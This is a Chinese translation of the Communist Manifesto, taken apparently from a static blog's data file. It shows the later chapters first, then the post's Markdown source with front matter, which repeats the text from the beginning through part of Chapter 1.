这种社会主义非常透彻地分析了现代生产关系中的矛盾。它揭穿了经济学家的虚伪的粉饰。它确凿地证明了机器和分工的破坏作用、资本和地产的积聚、生产过剩、危机、小资产者和小农的必然没落、无产阶级的贫困、生产的无政府状态、财富分配的极不平均、各民族之间的毁灭性的工业战争，以及旧风尚、旧家庭关系和旧民族性的解体。\n　　但是，这种社会主义按其实际内容来说，或者是企图恢复旧的生产资料和交换手段，从而恢复旧的所有制关系和旧的社会，或者是企图重新把现代的生产资料和交换手段硬塞到已被它们突破而且必然被突破的旧的所有制关系的框子里去。它在这两种场合都是反动的，同时又是空想的。\n　　工业中的行会制度，农业中的宗法经济，——这就是它的最后结论。\n　　这一思潮在它以后的发展中变成了一种怯懦的悲叹。\n\n(丙)德国的或“真正的”社会主义\n\n　　法国的社会主义和共产主义的文献是在居于统治地位的资产阶级的压迫下产生的，并且是同这种统治作斗争的文字表现，这种文献被搬到德国的时候，那里的资产阶级才刚刚开始进行反对封建专制制度的斗争。\n　　德国的哲学家、半哲学家和美文学家，贪婪地抓住了这种文献，不过他们忘记了：在这种著作从法国搬到德国的时候，法国的生活条件却没有同时搬过去。在德国的条件下，法国的文献完全失去了直接实践的意义，而只具有纯粹文献的形式。它必然表现为关于真正的社会、关于实现人的本质的无谓思辨。这样，第一次法国革命的要求，在18世纪的德国哲学家看来，不过是一般“实践理性”的要求，而革命的法国资产阶级的意志的表现，在他们心目中就是纯粹意志、本来的意志、真正人的意志的规律。\n　　德国著作家的唯一工作，就是把新的法国的思想同他们的旧的哲学信仰调和起来，或者毋宁说，就是从他们的哲学观点出发去掌握法国的思想。\n　　这种掌握，就象掌握外国语一样，是通过翻译的。\n　　大家知道，僧侣们曾经在古代异教经典的手抄本上面写上荒诞的天主教圣徒传。德国著作家对世俗的法国文献采取相反的作法。他们在法国的原著下面写上自己的哲学胡说。例如，他们在法国人对货币关系的批判下面写上“人的本质的外化”，在法国人对资产阶级国家的批判下面写上所谓“抽象普遍物的统治的扬弃”，等等。\n　　这种在法国人的论述下面塞进自己哲学词句的作法，他们称之为“行动的哲学”、“真正的社会主义”、“德国的社会主义科学”、“社会主义的哲学论证”，等等。\n　　法国的社会主义和共产主义的文献就这样被完全阉割了。既然这种文献在德国人手里已不再表现一个阶级反对另一个阶级的斗争，于是德国人就认为：他们克服了“法国人的片面性”，他们不代表真实的要求，而代表真理的要求，不代表无产者的利益，而代表人的本质的利益，即一般人的利益，这种人不属于任何阶级，根本不存在于现实界，而只存在于云雾弥漫的哲学幻想的太空。\n　　这种曾经郑重其事地看待自己那一套拙劣的小学生作业并且大言不惭地加以吹嘘的德国社会主义，现在渐渐失去了它的自炫博学的天真。\n　　德国的特别是普鲁士的资产阶级反对封建主和专制王朝的斗争，一句话，自由主义运动，越来越严重了。\n　　于是，“真正的”社会主义就得到了一个好机会，把社会主义的要求同政治运动对立起来，用诅咒异端邪说的传统办法诅咒自由主义，诅咒代议制国家，诅咒资产阶级的竞争、资产阶级的新闻出版自由、资产阶级的法、资产阶级的自由和平等，并且向人民群众大肆宣扬，说什么在这个资产阶级运动中，人民群众非但一无所得，反而会失去一切。德国的社会主义恰好忘记了，法国的批判(德国的社会主义是这种批判的可怜的回声)是以现代的资产阶级社会以及相应的物质生活条件和相当的政治制度为前提的，而这一切前提当时在德国正是尚待争取的。\n　　这种社会主义成了德意志各邦专制政府及其随从——僧侣、教员、容克和官僚求之不得的、吓唬来势汹汹的资产阶级的稻草人。\n　　这种社会主义是这些政府用来镇压德国工人起义的毒辣的皮鞭和枪弹的甜蜜的补充。\n　　既然“真正的”社会主义就这样成了这些政府对付德国资产阶级的武器，那么它也就直接代表了一种反动的利益，即德国小市民的利益。在德国，16世纪遗留下来的、从那时起经常以不同形式重新出现的小资产阶级，是现存制度的真实的社会基础。\n　　保存这个小资产阶级，就是保存德国的现存制度。这个阶级胆战心惊地从资产阶级的工业统治和政治统治那里等候着无可幸免的灭亡，这一方面是由于资本的积聚，另一方面是由于革命无产阶级的兴起。在它看来，“真正的”社会主义能起一箭双雕的作用。“真正的”社会主义象瘟疫一样流行起来了。\n　　德国的社会主义者给自己的那几条干瘪的“永恒真理”披上一件用思辨的蛛丝织成的、绣满华丽辞藻的花朵和浸透甜情蜜意的甘露的外衣，这件光彩夺目的外衣只是使他们的货物在这些顾客中间增加销路罢了。\n　　同时，德国的社会主义也越来越认识到自己的使命就是充当这种小市民的夸夸其谈的代言人。\n　　它宣布德意志民族是模范的民族，德国小市民是模范的人。它给这些小市民的每一种丑行都加上奥秘的、高尚的、社会主义的意义，使之变成完全相反的东西。它发展到最后，就直接反对共产主义的“野蛮破坏的”倾向，并且宣布自己是不偏不倚的超乎任何阶级斗争之上的。现今在德国流行的一切所谓社会主义和共产主义的著作，除了极少数的例外，都属于这一类卑鄙龌龊的、令人委靡的文献。\n\n2．保守的或资产阶级的社会主义\n\n\n　　资产阶级中的一部分人想要消除社会的弊病，以便保障资产阶级社会的生存。\n　　这一部分人包括：经济学家、博爱主义者、人道主义者、劳动阶级状况改善派、慈善事业组织者、动物保护协会会员、戒酒协会发起人以及形形式色色的小改良家。这种资产阶级的社会主义甚至被制成一些完整的体系。\n　　我们可以举蒲鲁东的《贫困的哲学》作为例子。\n　　社会主义的资产者愿意要现代社会的生存条件，但是不要由这些条件必然产生的斗争和危险。他们愿意要现存的社会，但是不要那些使这个社会革命化和瓦解的因素。他们愿意要资产阶级，但是不要无产阶级。在资产阶级看来，它所统治的世界自然是最美好的世界。资产阶级的社会主义把这种安慰人心的观念制成半套或整套的体系。它要求无产阶级实现它的体系，走进新的耶路撒冷，其实它不过是要求无产阶级停留在现今的社会里，但是要拋弃他们关于这个社会的可恶的观念。\n　　这种社会主义的另一种不够系统、但是比较实际的形式，力图使工人阶级厌弃一切革命运动，硬说能给工人阶级带来好处的并不是这样或那样的政治改革，而仅仅是物质生活条件即经济关系的改变。但是，这种社会主义所理解的物质生活条件的改变，绝对不是只有通过革命的途径才能实现的资产阶级生产关系的消灭，而是一些行政上的改良，这些改良是在这种生产关系的基础上实行的，因而丝毫不会改变资本和雇佣劳动的关系，至多只能减少资产阶级的统治费用和简化它的财政管理。\n　　资产阶级的社会主义只有在它变成纯粹的演说辞令的时候，才获得自己的适当的表现。\n　　自由贸易！为了工人阶级的利益；保护关税！为了工人阶级的利益；单身牢房！为了工人阶级的利益。——这才是资产阶级的社会主义唯一认真说出的最后的话。\n　　资产阶级的社会主义就是这样一个论断：资产者之为资产者，是为了工人阶级的利益。\n\n3．批判的空想的社会主义和共产主义\n\n\n　　在这里，我们不谈在现代一切大革命中表达过无产阶级要求的文献(巴贝夫等人的著作)。\n\n　　无产阶级在普遍激动的时代、在推翻封建社会的时期直接实现自己阶级利益的最初尝试，都不可避免地遭到了失败，这是由于当时无产阶级本身还不够发展，由于无产阶级解放的物质条件还没有具备，这些条件只是资产阶级时代的产物。随着这些早期的无产阶级运动而出现的革命文献，就其内容来说必然是反动的。这种文献倡导普遍的禁欲主义和粗陋的平均主义。\n\n　　本来意义的社会主义和共产主义的体系，圣西门、傅立叶、欧文等人的体系，是在无产阶级和资产阶级之间的斗争还不发展的最初时期出现的。关于这个时期，我们在前面已经叙述过了(见《资产阶级和无产阶级》)。\n\n　　诚然，这些体系的发明家看到了阶级的对立，以及占统治地位的社会本身中的瓦解因素的作用。但是，他们看不到无产阶级方面的任何历史主动性，看不到它所特有的任何政治运动。\n\n　　由于阶级对立的发展是同工业的发展步调一致的，所以这些发明家也不可能看到无产阶级解放的物质条件，于是他们就去探求某种社会科学、社会规律，以便创造这些条件。\n\n　　社会的活动要由他们个人的发明活动来代替，解放的历史条件要由幻想的条件来代替，无产阶级的逐步组织成为阶级要由他们特意设计出来的社会组织来代替。在他们看来，今后的世界历史不过是宣传和实施他们的社会计划。\n\n　　诚然，他们也意识到，他们的计划主要是代表工人阶级这一受苦最深的阶级的利益。在他们的心目中，无产阶级只是一个受苦最深的阶级。\n\n　　但是，由于阶级斗争不发展，由于他们本身的生活状况，他们就以为自己是高高超乎这种阶级对立之上的。他们要改善社会一切成员的生活状况，甚至生活最优裕的成员也包括在内。因此，他们总是不加区别地向整个社会呼吁，而且主要是向统治阶级呼吁。他们以为，人们只要理解他们的体系，就会承认这种体系是最美好的社会的最美好的计划。\n\n　　因此，他们拒绝一切政治行动，特别是一切革命行动；他们想通过和平的途径达到自己的目的，并且企图通过一些小型的、当然不会成功的试验，通过示范的力量来为新的社会福音开辟道路。\n\n　　这种对未来社会的幻想的描绘，是在无产阶级还很不发展、因而对本身的地位的认识还基于幻想的时候，同无产阶级对社会普遍改造的最初的本能的渴望相适应的。\n\n　　但是，这些社会主义和共产主义的著作也含有批判的成分。这些著作抨击现存社会的全部基础。因此，它们提供了启发工人觉悟的极为宝贵的材料。它们关于未来社会的积极的主张，例如消灭城乡对立，消灭家庭，消灭私人营利，消灭雇佣劳动，提倡社会和谐，把国家变成纯粹的生产管理机构，——所有这些主张都只是表明要消灭阶级对立，而这种阶级对立在当时刚刚开始发展，它们所知道的只是这种对立的早期的、不明显的、不确定的形式。因此，这些主张本身还带有纯粹空想的性质。\n\n　　批判的空想的社会主义和共产主义的意义，是同历史的发展成反比的。阶级斗争越发展和越具有确定的形式，这种超乎阶级斗争的幻想，这种反对阶级斗争的幻想，就越失去任何实践意义和任何理论根据。所以，虽然这些体系的创始人在许多方面是革命的，但是他们的信徒总是组成一些反动的宗派。这些信徒无视无产阶级的历史进展，还是死守着老师们的旧观点。因此，他们一贯企图削弱阶级斗争，调和对立。他们还总是梦想用试验的办法来实现自己的社会空想，创办单个的法伦斯泰尔，建立国内移民区，创立小伊加利亚，即袖珍版的新耶路撒冷，——而为了建造这一切空中楼阁，他们就不得不呼吁资产阶级发善心和慷慨解囊。他们逐渐地堕落到上述反动的或保守的社会主义者的一伙中去了，所不同的只是他们更加系统地卖弄学问，狂热地迷信自己那一套社会科学的奇功异效。\n\n　　因此，他们激烈地反对工人的一切政治运动，认为这种运动只是由于盲目地不相信新福音才发生的。\n\n　　在英国，有欧文主义者反对宪章派，在法国，有傅立叶主义者反对改革派。\n\n# 四、共产党人对各种反对党派的态度\n\n\n　　看过第二章之后，就可以了解共产党人同已经形成的工人政党的关系，因而也就可以了解他们同英国宪章派和北美土地改革派的关系。\n\n　　共产党人为工人阶级的最近的目的和利益而斗争，但是他们在当前的运动中同时代表运动的未来。在法国，共产党人同社会主义民主党联合起来反对保守的和激进的资产阶级，但是并不因此放弃对那些从革命的传统中承袭下来的空谈和幻想采取批判态度的权利。\n\n　　在瑞士，共产党人支持激进派，但是并不忽略这个政党是由互相矛盾的分子组成的，其中一部分是法国式的民主社会主义者，一部分是激进的资产者。\n\n　　在波兰人中间，共产党人支持那个把土地革命当做民族解放的条件的政党，即发动过1846年克拉科夫起义的政党。\n\n　　在德国，只要资产阶级采取革命的行动，共产党就同它一起去反对专制君主制、封建土地所有制和小市民的反动性。\n\n　　但是，共产党一分钟也不忽略教育工人尽可能明确地意识到资产阶级和无产阶级的敌对的对立，以便德国工人能够立刻利用资产阶级统治所必然带来的社会的和政治的条件作为反对资产阶级的武器，以便在推翻德国的反动阶级之后立即开始反对资产阶级本身的斗争。\n\n　　共产党人把自己的主要注意力集中在德国，因为德国正处在资产阶级革命的前夜，因为同17世纪的英国和18世纪的法国相比，德国将在整个欧洲文明更进步的条件下，拥有发展得多的无产阶级去实现这个变革，因而德国的资产阶级革命只能是无产阶级革命的直接序幕。\n\n　　总之，共产党人到处都支持一切反对现存的社会制度和政治制度的革命运动。\n\n　　在所有这些运动中，他们都特别强调所有制问题是运动的基本问题，不管这个问题的发展程度怎样。\n\n　　最后，共产党人到处都努力争取全世界的民主政党之间的团结和协调。\n\n　　共产党人不屑于隐瞒自己的观点和意图。他们公开宣布：他们的目的只有用暴力推翻全部现存的社会制度才能达到。让统治阶级在共产主义革命面前发抖吧。无产者在这个革命中失去的只是锁链。他们获得的将是整个世界。\n\n# 全世界无产者们，联合起来！","source":"_posts/共产党宣言.md","raw":"---\ntitle: 共产党宣言\ndate: 2020-05-08 11:41:32\ncategories:\n- 杂项\ntags:\n- 杂项\n---\n\n# 共产党宣言\n\n\n\n\n\n　　一个幽灵，共产主义的幽灵，在欧洲游荡。为了对这个幽灵进行神圣的围剿，旧欧洲的一切势力，教皇和沙皇、梅特涅和基佐、法国的激进派和德国的警察，都联合起来了。\n　　有哪一个反对党不被它的当政的敌人骂为共产党呢？又有哪一个反对党不拿共产主义这个罪名去回敬更进步的反对党人和自己的反动敌人呢？\n　　从这一事实中可以得出两个结论：\n　　共产主义已经被欧洲的一切势力公认为一种势力；\n　　现在是共产党人向全世界公开说明自己的观点、自己的目的、自己的意图并且拿党自己的宣言来反驳关于共产主义幽灵的神话的时候了。\n　　为了这个目的，各国共产党人集会于伦敦，拟定了如下的宣言，用英文、法文、德文、意大利文、弗拉芒文和丹麦文公布于世。\n\n# 一、资产者和无产者\n\n\n　　至今一切社会的历史都是阶级斗争的历史。\n\n　　自由民和奴隶、贵族和平民、领主和农奴、行会师傅和帮工，一句话，压迫者和被压迫者，始终处于相互对立的地位，进行不断的、有时隐蔽有时公开的斗争，而每一次斗争的结局是整个社会受到革命改造或者斗争的各阶级同归于尽。\n\n　　在过去的各个历史时代，我们几乎到处都可以看到社会完全划分为各个不同的等级，看到社会地位分成的多种多样的层次。在古罗马，有贵族、骑士、平民、奴隶，在中世纪，有封建主、臣仆、行会师傅、帮工、农奴，而且几乎在每一个阶级内部又有一些特殊的阶层。\n\n　　从封建社会的灭亡中产生出来的现代资产阶级社会并没有消灭阶级对立。它只是用新的阶级、新的压迫条件、新的斗争形式代替了旧的。\n\n　　但是，我们的时代，资产阶级时代，却有一个特点：它使阶级对立简单化了。整个社会日益分裂为两大敌对的阵营，分裂为两大相互直接对立的阶级：资产阶级和无产阶级。\n\n　　从中世纪的农奴中产生了初期城市的城关市民；从这个市民等级中发展出最初的资产阶级分子。\n\n　　美洲的发现、绕过非洲的航行，给新兴的资产阶级开辟了新天地。东印度和中国的市场、美洲的殖民化、对殖民地的贸易、交换手段和一般的商品的增加，使商业、航海业和工业空前高涨，因而使正在崩溃的封建社会内部的革命因素迅速发展。\n\n　　以前那种封建的或行会的工业经营方式已经不能满足随着新市场的出现而增加的需求了。工场手工业代替了这种经营方式。行会师傅被工业的中间等级排挤掉了；各种行业组织之间的分工随着各个作坊内部的分工的出现而消失了。\n\n　　但是，市场总是在扩大，需求总是在增加。甚至工场手工业也不再能满足需要了。于是，蒸汽和机器引起了工业生产的革命。现代大工业化替了工场手工业；工业中的百万富翁，一支一支产业大军的首领，现代资产者，代替了工业的中间等级。\n\n　　大工业建立了由美洲的发现所准备好的世界市场。世界市场使商业、航海业和陆路交通得到了巨大的发展。这种发展又反过来促进了工业的扩展，同时，随着工业、商业、航海业和铁路的扩展，资产阶级也在同一程度上得到发展，增加自己的资本，把中世纪遗留下来的一切阶级都排挤到后面去。\n\n　　由此可见，现代资产阶级本身是一个长期发展过程的产物，是生产方式和交换方式的一系列变革的产物。\n\n　　资产阶级的这种发展的每一个阶段，都伴随着相应的政治上进展。它在封建主统治下是被压迫的等级，在公社里是武装的和自治的团体，在一些地方组成独立的城市共和国，在另一些地方组成君主国中的纳税的第三等级；后来，在工场手工业时期，它是等级制君主国或专制君主国中同贵族抗衡的势力，而且是大君主国的主要基础；最后，从大工业和世界市场建立的时候起，它在现代的代议制国家里夺得了独占的政治统治。现代的国家政权不过是管理整个资产阶级的共同事务的委员会罢了。\n\n　　资产阶级在历史上曾经起过非常革命的作用。\n\n　　资产阶级在它已经取得了统治的地方把一切封建的、宗法的和田园诗般的关系都破坏了。它无情地斩断了把人们束缚于天然尊长的形形色色的封建羁绊，它使人和人之间除了赤裸裸的利害关系，除了冷酷无情的“现金交易”，就再也没有任何别的联系了。它把宗教虔诚、骑士热忱、小市民伤感这些情感的神圣发作，淹没在利己主义打算的冰水之中。它把人的尊严变成了交换价值，用一种没有良心的贸易自由代替了无数特许的和自力挣得的自由。总而言之，它用公开的、无耻的、直接的、露骨的剥削代替了由宗教幻想和政治幻想掩盖着的剥削。\n\n　　资产阶级抹去了一切向来受人尊崇和令人敬畏的职业的神圣光环。它把医生、律师、教士、诗人和学者变成了它出钱招雇的雇佣劳动者。\n\n　　资产阶级撕下了罩在家庭关系上的温情脉脉的面纱，把这种关系变成了纯粹的金钱关系。\n\n　　资产阶级揭示了，在中世纪深受反动派称许的那种人力的野蛮使用，是以极端怠惰作为相应补充的。它第一个证明了，人的活动能够取得什么样的成就。它创造了完全不同于埃及金字塔、罗马水道和哥特式教堂的奇迹；它完成了完全不同于民族大迁徙和十字军东征的远征。\n\n　　资产阶级除非对生产工具，从而对生产关系，从而对全部社会关系不断地进行革命，否则就不能生存下去。反之，原封不动地保持旧的生产方式，却是过去的一切工业阶级生存的首要条件。生产的不断变革，一切社会状况不停的动荡，永远的不安定和变动，这就是资产阶级时代不同于过去一切时代的地方。一切固定的僵化的关系以及与之相适应的素被尊崇的观念和见解都被消除了，一切新形成的关系等不到固定下来就陈旧了。一切等级的和固定的东西都烟消云散了，一切神圣的东西都被亵渎了。人们终于不得不用冷静的眼光来看他们的生活地位、他们的相互关系。\n\n　　不断扩大产品销路的需要，驱使资产阶级奔走于全球各地。它必须到处落户，到处开发，到处建立联系。\n\n　　资产阶级，由于开拓了世界市场，使一切国家的生产和消费都成为世界性的了。使反动派大为惋惜的是，资产阶级挖掉了工业脚下的民族基础。古老的民族工业被消灭了，并且每天都还在被消灭。它们被新的工业排挤掉了，新的工业的建立已经成为一切文明民族的生命攸关的问题；这些工业所加工的，已经不是本地的原料，而是来自极其遥远的地区的原料；它们的产品不仅供本国消费，而且同时供世界各地消费。旧的、靠国产品来满足的需要，被新的、要靠极其遥远的国家和地带的产品来满足的需要所代替了。过去那种地方的和民族的自给自足和闭关自守状态，被各民族的各方面的互相往来和各方面的互相依赖所代替了。物质的生产是如此，精神的生产也是如此。各民族的精神产品成了公共的财产。民族的片面性和局限性日益成为不可能，于是由许多种民族的和地方的文学形成了一种世界的文学。\n\n　　资产阶级，由于一切生产工具的迅速改进，由于交通的极其便利，把一切民族甚至最野蛮的民族都卷到文明中来了。它的商品的低廉价格，是它用来摧毁一切万里长城、征服野蛮人最顽强的仇外心理的重炮。它迫使一切民族——如果它们不想灭亡的话——采用资产阶级的生产方式；它迫使它们在自己那里推行所谓文明，即变成资产者。一句话，它按照自己的面貌为自己创造出一个世界。\n\n　　资产阶级使农村屈服于城市的统治。它创立了巨大的城市，使城市人口比农村人口大大增加起来，因而使很大一部分居民脱离了农村生活的愚昧状态。正象它使农村从属于城市一样，它使未开化和半开化的国家从属于文明的国家，使农民的民族从属于资产阶级的民族，使东方从属于西方。\n\n　　资产阶级日甚一日地消灭生产资料、财产和人口的分散状态。它使人口密集起来，使生产资料集中起来，使财产聚集在少数人的手里。由此必然产生的结果就是政治的集中。各自独立的、几乎只有同盟关系的、各有不同利益、不同法律、不同政府、不同关税的各个地区，现在已经结合为一个拥有统一的政府、统一的法律、统一的民族阶级利益和统一的关税的统一的民族。\n\n　　资产阶级在它的不到一百年的阶级统治中所创造的生产力，比过去一切世代创造的全部生产力还要多，还要大。自然力的征服，机器的采用，化学在工业和农业中的应用，轮船的行驶，铁路的通行，电报的使用，整个整个大陆的开垦，河川的通航，仿佛用法术从地下呼唤出来的大量人口，——过去哪一个世纪料想到在社会劳动里蕴藏有这样的生产力呢？\n\n　　由此可见，资产阶级赖以形成的生产资料和交换手段，是在封建社会里造成的。在这些生产资料和交换手段发展的一定阶段上，封建社会的生产和交换在其中进行的关系，封建的农业和工场手工业组织，一句话，封建的所有制关系，就不再适应已经发展的生产力了。这种关系已经在阻碍生产而不是促进生产了。它变成了束缚生产的桎梏。它必须被炸毁，而且已经被炸毁了。\n\n　　起而代之的是自由竞争以及与自由竞争相适应的社会制度和政治制度、资产阶级的经济统治和政治统治。\n\n　　现在，我们眼前又进行着类似的运动。资产阶级的生产关系和交换关系，资产阶级的所有制关系，这个曾经仿佛用法术创造了如此庞大的生产资料和交换手段的现代资产阶级社会，现在像一个魔法师一样不能再支配自己用法术呼唤出来的魔鬼了。几十年来的工业和商业的历史，只不过是现代生产力反抗现代生产关系、反抗作为资产阶级及其统治的存在条件的所有制关系的历史。只要指出在周期性的重复中越来越危及整个资产阶级社会生存的商业危机就够了。在商业危机期间，总是不仅有很大一部分制成的产品被毁灭掉，而且有很大一部分已经造成的生产力被毁灭掉。在危机期间，发生一种在过去一切时代看来都好象是荒唐现象的社会瘟疫，即生产过剩的瘟疫。社会突然发现自己回到了一时的野蛮状态；仿佛是一次饥荒、一场普遍的毁灭性战争，使社会失去了全部生活资料；仿佛是工业和商业全被毁灭了，——这是什么缘故呢？因为社会上文明过度，生活资料太多，工业和商业太发达。社会所拥有的生产力已经不能再促进资产阶级文明和资产阶级所有制关系的发展；相反，生产力已经强大到这种关系所不能适应的地步，它已经受到这种关系的阻碍；而它一着手克服这种障碍，就使整个资产阶级社会陷入混乱，就使资产阶级所有制的存在受到威胁。资产阶级的关系已经太狭窄了，再容纳不了它本身所造成的财富了。——资产阶级用什么办法来克服这种危机呢？一方面不得不消灭大量生产力，另一方面夺取新的市场，更加彻底地利用旧的市场。这究竟是怎样的一种办法呢？这不过是资产阶级准备更全面更猛烈的危机的办法，不过是使防止危机的手段越来越少的办法。\n\n　　资产阶级用来推翻封建制度的武器，现在却对准资产阶级自己了。\n\n　　但是，资产阶级不仅锻造了置自身于死地的武器；它还产生了将要运用这种武器的人——现代的工人，即无产者。\n\n　　随着资产阶级即资本的发展，无产阶级即现代工人阶级也在同一程度上得到发展；现代的工人只有当他们找到工作的时候才能生存，而且只有当他们的劳动增殖资本的时候才能找到工作。这些不得不把自己零星出卖的工人，像其它任何货物一样，也是一种商品，所以他们同样地受到竞争的一切变化、市场的一切波动的影响。\n\n　　由于机器的推广和分工，无产者的劳动已经失去了任何独立的性质，因而对工人也失去了任何吸引力。工人变成了机器的单纯的附属品，要求他做的只是极其简单、极其单调和极容易学会的操作。因此，花在工人身上的费用，几乎只限于维持工人生活和延续工人后代所必需的生活资料。但是，商品的价格，从而劳动的价格，是同它的生产费用相等的。因此，劳动越使人感到厌恶，工资也就越减少。不仅如此，机器越推广，分工越细致，劳动量也就越增加，这或者是由于工作时间的延长，或者是由于在一定时间内所要求的劳动的增加，机器运转的加速，等等。\n\n　　现代工业已经把家长式的师傅的小作坊变成了工业资本家的大工厂。挤在工厂里的工人群众就象士兵一样被组织起来。他们是产业军的普通士兵，受着各级军士和军官的层层监视。他们不仅是资产阶级的、资产阶级国家的奴隶，并且每日每时都受机器、受监工、首先是受各个经营工厂的资产者本人的奴役。这种专制制度越是公开地把营利宣布为自己的最终目的，它就越是可鄙、可恨和可恶。\n\n　　手的操作所要求的技巧和气力越少，换句话说，现代工业越发达，男工也就越受到女工和童工的排挤。对工人阶级来说，性别和年龄的差别再没有什么社会意义了。他们都只是劳动工具，不过因为年龄和性别的不同而需要不同的费用罢了。\n\n　　当厂主对工人的剥削告一段落，工人领到了用现钱支付的工资的时候，马上就有资产阶级中的另一部分人——房东、小店主、当铺老板等等向他们扑来。\n\n　　以前的中间等级的下层，即小工业家、小商人和小食利者，手工业者和农民——所有这些阶级都降落到无产阶级的队伍里来了，有的是因为他们的小资本不足以经营大工业，经不起较大资本家的竞争；有的是因为他们的手艺已经被新的生产方法弄得不值钱了。无产阶级的队伍就是这样从居民的所有阶级中得到补充的。\n\n　　无产阶级经历了各个不同的发展阶段。它反对资产阶级的斗争是和它的存在同时开始的。\n\n　　最初是单个的工人，然后是某一工厂的工人，然后是某一地方的某一劳动部门的工人，同直接剥削他们的单个资产者作斗争。他们不仅仅攻击资产阶级的生产关系，而且攻击生产工具本身；他们毁坏那些来竞争的外国商品，捣毁机器，烧毁工厂，力图恢复已经失去的中世纪工人的地位。\n\n　　在这个阶段上，工人们还是分散在全国各地并为竞争所分裂的群众。工人的大规模集结，还不是他们自己联合的结果，而是资产阶级联合的结果，当时资产阶级为了达到自己的政治目的必须而且暂时还能够把整个无产阶级发动起来。因此，在这个阶段上，无产者不是同自己的敌人作斗争，而是同自己的敌人的敌人作斗争，即同专制君主制的残余、地主、非工业资产阶级和小资产者作斗争。因此，整个历史运动都集中在资产阶级手里；在这种条件下取得的每一个胜利都是资产阶级的胜利。\n\n　　但是，随着工业的发展，无产阶级不仅人数增加了，而且它结合成更大的集体，它的力量日益增长，它越来越感觉到自己的力量。机器使劳动的差别越来越小，使工资几乎到处都降到同样低的水平，因而无产阶级内部的利益和生活状况也越来越趋于一致。资产者彼此间日益加剧的竞争以及由此引起的商业危机，使工人的工资越来越不稳定；机器的日益迅速的和继续不断的改良，使工人的整个生活地位越来越没有保障；单个工人和单个资产者之间的冲突越来越具有两个阶级的冲突的性质。工人开始成立反对资产者的同盟；他们联合起来保卫自己的工资。他们甚至建立了经常性的团体，以便为可能发生的反抗准备食品。有些地方，斗争爆发为起义。\n\n　　工人有时也得到胜利，但这种胜利只是暂时的。他们斗争的真正成果并不是直接取得的成功，而是工人的越来越扩大的联合。这种联合由于大工业所造成的日益发达的交通工具而得到发展，这种交通工具把各地的工人彼此联系起来。只要有了这种联系，就能把许多性质相同的地方性的斗争汇合成全国性的斗争，汇合成阶级斗争。而一切阶级斗争都是政治斗争。中世纪的市民靠乡间小道需要几百年才能达到的联合，现代的无产者利用铁路只要几年就可以达到了。\n\n　　无产者组织成为阶级，从而组织成为政党这件事，不断地由于工人的自相竞争而受到破坏。但是，这种组织总是重新产生，并且一次比一次更强大，更坚固，更有力。它利用资产阶级内部的分裂，迫使他们用法律形式承认工人的个别利益。英国的十小时工作日法案就是一个例子。\n\n　　旧社会内部的所有冲突在许多方面都促进了无产阶级的发展。资产阶级处于不断的斗争中：最初反对贵族：后来反对同工业进步有利害冲突的那部分资产阶级；经常反对一切外国的资产阶级。在这一切斗争中，资产阶级都不得不向无产阶级呼吁，要求无产阶级援助，这样就把无产阶级卷进了政治运动。于是，资产阶级自己就把自己的教育因素即反对自身的武器给予了无产阶级。\n\n　　其次，我们已经看到，工业的进步把统治阶级的整批成员拋到无产阶级队伍里去，或者至少也使他们的生活条件受到威胁。他们也给无产阶级带来了大量的教育因素。\n\n　　最后，在阶级斗争接近决战的时期，统治阶级内部的、整个旧社会内部的瓦解过程，就达到非常强烈、非常尖锐的程度，甚至使得统治阶级中的一小部分人脱离统治阶级而归附于革命的阶级，即掌握着未来的阶级。所以，正像过去贵族中有一部分人转到资产阶级方面一样，现在资产阶级中也有一部分人，特别是已经提高到从理论上认识整个历史运动这一水平的一部分资产阶级思想家，转到无产阶级方面来了。\n\n　　在当前同资产阶级对立的一切阶级中，只有无产阶级是真正革命的阶级。其余的阶级都随着大工业的发展而日趋没落和灭亡，无产阶级却是大工业本身的产物。\n\n　　中间等级，即小工业家、小商人、手工业者、农民，他们同资产阶级作斗争，都是为了维护他们这种中间等级的生存，以免于灭亡。所以，他们不是革命的，而是保守的。不仅如此，他们甚至是反动的，因为他们力图使历史的车轮倒转。如果说他们是革命的，那是鉴于他们行将转入无产阶级的队伍，这样，他们就不是维护他们目前的利益，而是维护他们将来的利益，他们就离开自己原来的立场，而站到无产阶级的立场上来。\n\n　　流氓无产阶级是旧社会最下层中消极的腐化的部分，他们在一些地方也被无产阶级革命卷到运动里来，但是，由于他们的整个生活状况，他们更甘心于被人收买，去干反动的勾当。\n\n　　在无产阶级的生活条件中，旧社会的生活条件已经被消灭了。无产者是没有财产的；他们和妻子儿女的关系同资产阶级的家庭关系再没有任何共同之处了；现代的工业劳动，现代的资本压迫，无论在英国或法国，无论在美国或德国，都是一样的，都使无产者失去了任何民族性。法律、道德、宗教，在他们看来全都是资产阶级偏见，隐藏在这些偏见后面的全都是资产阶级利益。\n\n　　过去一切阶级在争得统治之后，总是使整个社会服从于它们发财致富的条件，企图以此来巩固它们已经获得的生活地位。无产者只有废除自己的现存的占有方式，从而废除全部现存的占有方式，才能取得社会生产力。无产者没有什么自己的东西必须加以保护，他们必须摧毁至今保护和保障私有财产的一切。\n\n　　过去的一切运动都是少数人的或者为少数人谋利益的运动。无产阶级的运动是绝大多数人的、为绝大多数人谋利益的独立的运动。无产阶级，现今社会的最下层，如果不炸毁构成官方社会的整个上层，就不能抬起头来，挺起胸来。\n\n　　如果不就内容而就形式来说，无产阶级反对资产阶级的斗争首先是一国范围内的斗争。每一个国家的无产阶级当然首先应该打倒本国的资产阶级。\n\n　　在叙述无产阶级发展的最一般的阶段的时候，我们循序探讨了现存社会内部或多或少隐蔽着的国内战争，直到这个战争爆发为公开的革命，无产阶级用暴力推翻资产阶级而建立自己的统治。\n\n　　我们已经看到，至今的一切社会都是建立在压迫阶级和被压迫阶级的对立之上的。但是，为了有可能压迫一个阶级，就必须保证这个阶级至少有能够勉强维持它的奴隶般的生存的条件。农奴曾经在农奴制度下挣扎到公社社员的地位，小资产者曾经在封建专制制度的束缚下挣扎到资产者的地位。现代的工人却相反，他们并不是随着工业的进步而上升，而是越来越降到本阶级的生存条件以下。工人变成赤贫者，贫困比人口和财富增长得还要快。由此可以明显地看出，资产阶级再不能做社会的统治阶级了，再不能把自己阶级的生存条件当做支配一切的规律强加于社会了。资产阶级不能统治下去了，因为它甚至不能保证自己的奴隶维持奴隶的生活，因为它不得不让自己的奴隶落到不能养活它反而要它来养活的地步。社会再不能在它统治下生活下去了，就是说，它的存在不再同社会兼容了。\n\n　　